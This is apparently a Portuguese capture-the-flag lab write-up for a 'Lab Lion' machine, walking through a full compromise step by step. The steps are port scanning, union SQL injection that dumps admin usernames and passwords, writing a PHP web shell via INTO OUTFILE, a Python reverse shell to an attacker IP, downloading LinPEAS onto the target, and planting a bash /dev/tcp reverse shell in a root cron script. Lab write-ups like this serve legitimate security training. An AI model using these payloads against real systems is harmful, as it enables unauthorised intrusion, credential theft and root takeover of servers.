## 🦁 **Lab Lion - Hacking Club**

Sabemos que o **Lab Lion** tem três vulnerabilidades principais:

1. **SQL Injection (SQLi)** → permite RCE (execução remota de comandos).
    
2. **Upload de Web Shell** → o atacante envia um script malicioso para controle remoto.
    
3. **Escalonamento de Privilégios via Cron Jobs** → execução automática e previsível de tarefas com permissões elevadas.
    

---

## Mas... O que é tudo isso?

### 1. **SQL Injection (SQLi) com RCE**

- **O que é?**  
    Uma falha onde o atacante insere comandos SQL maliciosos em campos de entrada (como login), manipulando o banco de dados.
    
- **Como funciona?**  
    Se mal protegido, o banco executa o comando malicioso, como:
    
    ```sql
    ' OR 1=1; -- 
    ```
    
    Ou algo ainda mais avançado como:
    
    ```sql
    '; system('whoami'); --
    ```
    
    Isso pode levar à **execução remota de comandos** se o banco interagir com o sistema operacional.
    
- **Comportamento esperado:**
    
    - Retorno inesperado de dados.
        
    - Comportamento anômalo no site.
        
    - Possibilidade de upload de arquivos ou execução de comandos.
        

---

### 2. **Upload de Web Shell**

- **O que é?**  
    Um tipo de backdoor: o atacante envia um arquivo (como `shell.php`) para o servidor.
    
- **Como funciona?**  
    Após o upload, o atacante acessa esse arquivo via navegador, com comandos como:
    
    ```
    http://site.com/uploads/shell.php?cmd=ls
    ```
    
- **Comportamento esperado:**
    
    - Shell remota com controle do sistema.
        
    - Possibilidade de navegar pelo servidor e explorar outras falhas.
        

---

### 3. **Escalonamento de Privilégios via Cron Jobs**

- **O que é?**  
    Uma técnica onde o atacante explora tarefas automatizadas com permissões maiores (como root).
    
- **Como funciona?**  
    Se o cron executar scripts de diretórios acessíveis, um atacante pode injetar código no arquivo e esperar o cron rodar.
    
- **Comportamento esperado:**
    
    - Ganho de acesso privilegiado (root).
        
    - Persistência e controle total do sistema.
        

---
### Comando Completo:**
```bash
sudo nmap -p- -Pn -min-rate 300 -oG Allports endereçosite
```

---

### **Análise Detalhada:**

| Parâmetro           | Explicação                                                 | Impacto                                                                  |
| ------------------- | ---------------------------------------------------------- | ------------------------------------------------------------------------ |
| **`sudo`**          | Executa o Nmap com privilégios de root                     | Permite escanear portas privilegiadas (1-1024) e usar técnicas avançadas |
| **`nmap`**          | Ferramenta de varredura de rede                            | Base de todo o comando                                                   |
| **`-p-`**           | Escaneia **todas as 65535 portas** (do 1 ao 65535)         | Varredura completa, mas lenta (sem filtros)                              |
| **`-Pn`**           | Ignora descoberta de hosts (considera o host como online)  | Útil se o host bloqueia ping (ICMP)                                      |
| **`-min-rate 300`** | Envia **no mínimo 300 pacotes/segundo**                    | Acelera o scan, mas pode ser detectado por IDS/IPS                       |
| **`-oG Allports`**  | Saída no formato **"Grepable"** no arquivo `Allports`      | Facilita extração de dados com ferramentas como `grep` ou `awk`          |
| **`endereçosite`**  | IP ou domínio do alvo (ex: `192.168.1.1` ou `example.com`) | Alvo do escaneamento                                                     |

---

### **Riscos e Considerações:**
1. **Alta Taxa de Pacotes (`-min-rate 300`)**:
   - **Vantagem**: Scan mais rápido (útil em redes internas).
   - **Desvantagem**: Pode ser bloqueado por firewalls ou detectado como ataque.

2. **Formato de Saída (`-oG`)**:
   - Exemplo de saída no arquivo `Allports`:
     ```
     Host: 192.168.1.1 ()     Status: Up
     Host: 192.168.1.1 ()     Ports: 22/open/tcp//ssh//, 80/open/tcp//http//
     ```

3. **Alternativas Recomendadas**:
   - Para scans mais discretos:  
     ```bash
     sudo nmap -p- -Pn -T4 -v --max-retries 1 -oN resultados.txt endereçosite
     ```
     - `-T4`: Velocidade balanceada.
     - `-v`: Modo verboso.
     - `--max-retries 1`: Reduz retransmissões.

---

### **Como Melhorar o Comando?**
Se o alvo for externo ou sensível, adicione:
```bash
sudo nmap -p- -Pn -min-rate 300 --max-parallelism 100 -oG Allports endereçosite
```
- `--max-parallelism 100`: Limita conexões simultâneas para evitar sobrecarga.

---
**ffuf** para fuzzing web:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://exemplo.com/FUZZ" -e .php -ic
```

### Explicação Detalhada:

| Parâmetro | Significado | Exemplo Correto | Observações |
|-----------|-------------|-----------------|-------------|
| `-w` | Especifica a wordlist | `/usr/share/wordlists/dirb/common.txt` | Caminho absoluto recomendado |
| `-u` | URL alvo | `http://exemplo.com/FUZZ` | O marcador `FUZZ` será substituído |
| `-e` | Extensões | `.php,.bak,.txt` | Múltiplas extensões separadas por vírgula |
| `-ic` | Ignora comentários na wordlist | - | Remove linhas que começam com `#` |

---

# Análise SQL Injection com UNION SELECT

## O Comando Injetado
```sql
' UNION SELECT 1,2,3,4,5,6,7#
```

## Por que o número 2 foi refletido?

1. **Mecanismo do UNION SELECT**:
   - O operador `UNION` combina os resultados de duas consultas SQL
   - O número de colunas em ambos os lados do UNION deve ser igual
   - Você testou com 7 valores (1 até 7) para descobrir quantas colunas a tabela tem

2. **Reflexão dos números**:
   - Os números que aparecem na página representam as colunas que são refletidas na saída
   - O número 2 apareceu porque é a coluna que a aplicação usa para exibir dados na página
   - As outras colunas (1,3,4,5,6,7) existem na tabela, mas não são usadas para exibição

3. **Por que apenas o 2?**:
   - A aplicação web provavelmente tem código como: `echo $row[1]` (considerando que a indexação começa em 0)
   - Ou pode ser a segunda coluna no comando SELECT original da aplicação
   - As outras colunas podem conter dados não exibidos (como IDs, timestamps, etc.)

---
# Análise Detalhada @@version

## Comando Original:
```sql
' UNION SELECT 1,@@version,3,4,5,6,7#
```

## Explicação Parte por Parte:

1. **`'`** (Aspa simples):
   - Quebra a sintaxe SQL original da aplicação
   - Fecha a string que o desenvolvedor provavelmente usou na query

2. **`UNION`**:
   - Operador que combina resultados de duas consultas SQL
   - Requer que ambas as consultas tenham o mesmo número de colunas

3. **`SELECT 1,@@version,3,4,5,6,7`**:
   - `1,3,4,5,6,7`: Valores estáticos para preencher as colunas necessárias
   - `@@version`: Variável especial do MySQL/MariaDB que retorna a versão do servidor

4. **`#`** (Cerquilha):
   - Comenta o restante da query original
   - Ignora qualquer código SQL que venha depois na query original

## Sobre o Resultado `5.5.68-MariaDB`:

Você está usando um servidor MariaDB versão 5.5.68 (fork do MySQL mantido pela comunidade).

## Obter o Nome do Banco de Dados Atual:

Substitua o `@@version` por uma função que retorne o nome do banco:

```sql
' UNION SELECT 1,database(),3,4,5,6,7#
```

Onde:
- `database()`: Função que retorna o nome do banco de dados atual em uso.
Achamos 'news'

---
## Então Usamos: 

```sql
' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema='news'#
```

### Explicação Detalhada:

1. **`'`** (Aspa simples):
   - Fecha a string da consulta SQL original da aplicação
   - Permite injetar código SQL adicional

2. **`UNION`** (correção de "unicon"):
   - Operador que combina resultados de duas consultas SQL
   - Requer que ambas as consultas retornem o mesmo número de colunas

3. **`SELECT 1,table_name,3,4,5,6,7`**:
   - `1,3,4,5,6,7`: Valores estáticos para preencher as colunas
   - `table_name`: Coluna que retorna os nomes das tabelas

4. **`FROM information_schema.tables`**:
   - `information_schema`: Banco de dados do sistema que contém metadados
   - `tables`: Tabela especial que lista todas as tabelas no servidor

5. **`WHERE table_schema='news'`**:
   - Filtra apenas tabelas do banco de dados chamado 'news'
   - `table_schema` é a coluna que armazena o nome do banco de dados

6. **`#`** (Cerquilha):
   - Comenta o restante da query original da aplicação
   - Ignora qualquer código SQL que venha depois

### Como Funciona na Prática:
1. A aplicação provavelmente tem uma query como:
   ```sql
   SELECT * FROM artigos WHERE titulo = '[INPUT_DO_USUARIO]'
   ```

2. Sua injeção transforma isso em:
   ```sql
   SELECT * FROM artigos WHERE titulo = '' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema='news'#'
   ```

3. O resultado mostrará:
   - Uma lista de nomes de tabelas do banco 'news'
   - Exibidas na posição onde o número 2 seria mostrado (como no seu teste anterior)

### Dica de Segurança:
Se a aplicação usar aspas duplas ou outro método de escape, você pode tentar:
```sql
' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=0x6e657773#
```
Onde `0x6e657773` é a representação hexadecimal de 'news'

---
## TBADMIN
```sql
' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='tbadmin'#
```

### Como Funciona na Prática:
1. A aplicação executa:
```sql
SELECT * FROM posts WHERE title='' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='tbadmin'#'
```

2. Resultado esperado:
   - Retorna os nomes das colunas da tabela `tbadmin`
   - Exibe na posição onde o número 2 aparecia antes

---
### Payload completo:

```sql
' UNION SELECT 1, CONCAT(AdminUserName, ":", AdminPassword), 3, 4, 5, 6, 7 FROM tbladmin#
```

---
### Explicação passo a passo:

|Parte do Comando|Explicação|
|---|---|
|`'`|Fecha o valor anterior da consulta SQL original (string aberta no backend). Isso injeta seu código a seguir.|
|`UNION`|Combina o resultado da query original com outra SELECT. Útil quando você não consegue alterar a query original diretamente, mas pode acoplar uma nova.|
|`SELECT`|Inicia a nova instrução SELECT com os dados que você quer extrair.|
|`1`|Um valor fixo (placeholder). Ele substitui a 1ª coluna no resultado da query original — deve manter o número de colunas igual para evitar erro.|
|`CONCAT(AdminUserName, ":", AdminPassword)`|Junta o nome de usuário e a senha da tabela `tbladmin`, separados por dois-pontos. Isso retorna algo como `admin:1234` em uma única coluna.|
|`3, 4, 5, 6, 7`|Placeholders para completar o número total de colunas. O número deve bater com o número de colunas da query original (por isso se usa `ORDER BY` e `UNION SELECT NULL,...` para descobrir antes).|
|`FROM tbladmin`|Especifica a tabela onde estão as colunas que queremos. Aqui, `tbladmin` provavelmente guarda os dados de login.|
|`#`|Comenta o restante da query original para que nada mais seja executado após sua injeção. No MySQL, `--` ou `#` são usados como comentário.|

---

Vamos **explicar em detalhes o que aconteceu**, **por que funcionou** e **como conseguimos gravar uma web shell no diretório `/var/www/html/includes`**.

---

## O que são esses diretórios?

Esses caminhos que você citou são **pastas típicas de servidores web Linux com Apache/Nginx**, onde os arquivos do site ficam armazenados:

| Caminho                  | Significado                                                                |
| ------------------------ | -------------------------------------------------------------------------- |
| `/var/www/html`          | Diretório padrão do Apache para armazenar páginas da web.                  |
| `/var/www/html/images`   | Geralmente armazena imagens usadas no site.                                |
| `/var/www/html/vendor`   | Pasta comum em projetos PHP com Composer (pacotes de terceiros).           |
| `/var/www/html/includes` | Frequentemente usada para armazenar arquivos PHP auxiliares (ex: funções). |

---

## Como conseguimos gravar no `/var/www/html/includes`?

### 1. **A aplicação web está conectada a um banco de dados (MySQL ou MariaDB)**

O atacante explora uma falha de SQL Injection e **injeta comandos SQL arbitrários**.

---

### 2. **Comando malicioso injetado via SQLi:**

```sql
'union select 1,"",3,4,5,6,7 into outfile "/var/www/html/includes/cmd.php"#
```

Vamos destrinchar isso:

#### a) `'union select ...`

- Está usando a técnica de **`UNION SELECT`**, que permite combinar resultados de outra consulta com a original.
    
- Aqui, ela injeta uma nova linha de dados arbitrária.
    

#### b) `1,"",3,4,5,6,7`

- Simula uma linha com 7 colunas (deve **bater com a quantidade de colunas da consulta original**).
    
- O segundo campo (`""`) representa o conteúdo do arquivo que será escrito. Ele deveria conter **código PHP**, mas está em branco nesse exemplo. Em um caso real, seria algo como:
    
    ```php
    "<?php system($_GET['cmd']); ?>"
    ```
    

#### c) `into outfile "/var/www/html/includes/cmd.php"`

- Isso diz ao banco de dados para **salvar o conteúdo da linha** (a webshell) **diretamente em um arquivo** no disco do servidor.
    
- Esse recurso é permitido **se o banco tiver permissão de escrita** no caminho fornecido.
    

#### d) `#`

- Comentário do MySQL para ignorar o restante da query original.
    

---

## O que permitiu isso do lado do servidor?

1. **SQLi funcional e não filtrada.**
    
2. **Permissão do usuário do MySQL para escrever arquivos com `INTO OUTFILE`.**
    
3. **Diretório `/var/www/html/includes/` acessível e com permissão de escrita.**
    
4. **Servidor web permite execução de arquivos `.php` nesse caminho.**
    

---

## Como foi identificado que esse diretório era gravável?

Geralmente o atacante:

1. **Testa caminhos comuns manualmente** ou usando wordlists.
    
2. Usa comandos como:
    

```sql
'union select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/test.php"# 
```

3. Depois tenta acessar via navegador:
    

```
http://target-ip/test.php?cmd=id
```

4. Quando funciona, repete a operação com o caminho definitivo (ex: `/includes/`).
    

---

 Etapa: Conquistando uma Reverse Shell via Webshell PHP

Depois de conseguir **escrever a webshell `cmd.php`** no servidor através da **injeção SQL**, o objetivo agora é obter uma **conexão reversa (reverse shell)** — ou seja, fazer com que o servidor conecte de volta na sua máquina, te dando acesso ao shell interativo.

---

### Passo 1 – Verificar se existe Python no sistema da vítima:

Acesse a webshell com:

```
http://$site/includes/cmd.php?cmd=whereis python
```

O comando `whereis python` mostra se e onde o Python está instalado. O resultado pode ser algo como:

```
python: /usr/bin/python2.7 /usr/bin/python
```

---

### Passo 2 – Preparar o **payload de reverse shell** em Python

Com base nisso, você pode usar o Python para fazer uma conexão reversa para seu IP:

```bash
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("SEU_IP",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty;
pty.spawn("sh")'
```

Esse script faz o seguinte:

- Cria um socket.
    
- Conecta ao seu IP na porta 4444.
    
- Redireciona stdin, stdout e stderr para esse socket.
    
- Usa `pty.spawn("sh")` para invocar um shell pseudo-interativo (melhor experiência).
    

---

### Passo 3 – Preparar o **ouvinte (listener)** na sua máquina

Antes de executar a reverse shell, você deve estar pronto para **receber a conexão** com o `netcat`:

```bash
nc -lvp 4444
```

- `-l`: listen (escutar)
    
- `-v`: modo verboso
    
- `-p 4444`: porta onde você vai escutar
    

---

### Passo 4 – Executar a reverse shell via webshell

Chame sua payload pelo navegador usando sua webshell `cmd.php`:

```
http://$site/includes/cmd.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("SEU_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

## **Por que conseguimos essa conexão reversa com o servidor?**

Tudo começa com a **injeção SQL**. O servidor web usa consultas SQL inseguras, permitindo que você injete código. Nesse caso, você usou a injeção para **criar um arquivo PHP malicioso** (`cmd.php`) com conteúdo como:

```php
<?php system($_GET['cmd']); ?>
```

Esse arquivo virou uma **webshell**: uma página PHP que executa comandos no servidor quando você acessa:

```
http://target/includes/cmd.php?cmd=whoami
```

---

## **Como a conexão reversa funciona**

A reverse shell em Python faz com que o **servidor inicie uma conexão com a sua máquina**, como se fosse um cliente. Isso evita filtros de firewall que bloqueiam conexões de fora para dentro (como SSH). O servidor “liga” para você.

A linha de código:

```bash
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("SEU_IP",4444));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
import pty; pty.spawn("sh")'
```

Faz o seguinte:

1. Cria um socket de rede.
    
2. Conecta à sua máquina na porta 4444.
    
3. Redireciona os canais de entrada/saída para o socket.
    
4. Abre um shell (`sh`) e conecta tudo à sua sessão Netcat.
    

Você, do outro lado (no Kali, por exemplo), já está escutando com:

```bash
nc -lvp 4444
```

Assim, você ganha **um shell remoto no servidor**, executando comandos como se estivesse logado localmente.

---

## Atualizando o shell simples para um TTY interativo

Quando essa conexão acontece, o shell é limitado:

- Não responde bem ao `Tab`, `Ctrl+C`, setas, etc.
    
- Falta suporte ao terminal interativo (TTY).
    

### Solução: Atualizar o shell para TTY

Execute no shell reverso:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Isso “espelha” um terminal Bash com suporte básico.

### Depois: Suspender temporariamente o shell (Ctrl+Z)

Isso te devolve ao terminal local. Agora execute:

```bash
stty raw -echo
fg
```

- `stty raw -echo`: ajusta o terminal para modo bruto (sem echo de teclas).
    
- `fg`: retorna para o shell reverso.
    

### Por fim:

```bash
export TERM=xterm
```

Isso melhora o comportamento do shell (cores, `clear`, `nano`, etc).

---

## **1. O que é o LinPEAS?**

[**LinPEAS**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) é um script automatizado usado em pós-exploração (post-exploitation) para encontrar **possíveis caminhos de escalonamento de privilégio** em sistemas Linux.

Ele varre o sistema em busca de:

- Binários SUID vulneráveis
    
- Cron jobs mal configurados
    
- Arquivos com permissões indevidas
    
- Credenciais em texto claro
    
- Serviços inseguros, e muito mais
    

---

## **2. Baixando o LinPEAS e transferindo pro alvo**

### No seu terminal (Kali ou máquina de ataque):

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 80
```

> Isso sobe um **servidor HTTP** simples na porta 80 para que o alvo possa baixar o script.

---

### No terminal do alvo (via shell reversa):

```bash
cd /tmp
wget http://SEU_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

## **3. Cron Jobs — O que são?**

**Cron jobs** são tarefas agendadas no Linux, configuradas no `crontab`. São usadas para:

- Backups automáticos
    
- Atualizações
    
- Execução recorrente de scripts
    

Eles podem ser configurados por **usuários normais** ou pelo **root**, e o cron executa essas tarefas nos horários definidos.

---

## **4. Encontramos um cronjob do root vulnerável**

No diretório:

```
/opt/lion
```

Há um arquivo chamado:

```
lion.backup.sh
```

Você descobriu, com LinPEAS ou manualmente, que:

- Ele é executado pelo **root** (via cron)
    
- Ele é editável por **outros usuários** (`-rw-rw-r--` ou `chmod 777`, por exemplo)
    

Esse é o cenário **perfeito para escalonamento de privilégio**.


---

## **5. Adicionando uma reverse shell no script**

No conteúdo de `lion.backup.sh`, você insere:

```bash
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/SEU_IP/1337 0>&1'
```

> Esse comando conecta de volta ao seu IP (na porta 1337) e abre um **bash interativo** com privilégios de root.

### Depois disso, no seu terminal, você escuta com Netcat:

```bash
nc -lvp 1337
```

Agora é só aguardar 1 minuto (tempo do cron). Quando o cron executar o script, você receberá a **conexão reversa como root**.

---

## **6. Shell interativo como root (TTY)**

Quando a conexão for estabelecida, você pode melhorar o shell da mesma forma que antes:

```bash
python -c "import pty; pty.spawn('/bin/bash')"
Ctrl + Z
stty raw -echo; fg
ENTER
export TERM=xterm
```

Agora você tem um terminal root completo, com suporte a comandos interativos como `nano`, `clear`, etc.

---

## **Resumo final: Por que tudo isso funciona**

|Etapa|O que permitiu o ataque?|
|---|---|
|Upload da webshell|Falta de validação e diretório com permissão de escrita|
|Execução da webshell|Código PHP executando comandos do usuário via `system()`|
|Reverse shell|Servidor permitindo execução de código e conexão de saída|
|Escalonamento via cron|Script executado como root, mas com permissão de escrita por usuário comum|
|Shell interativo|Técnicas para atualizar o shell para uma TTY funcional|
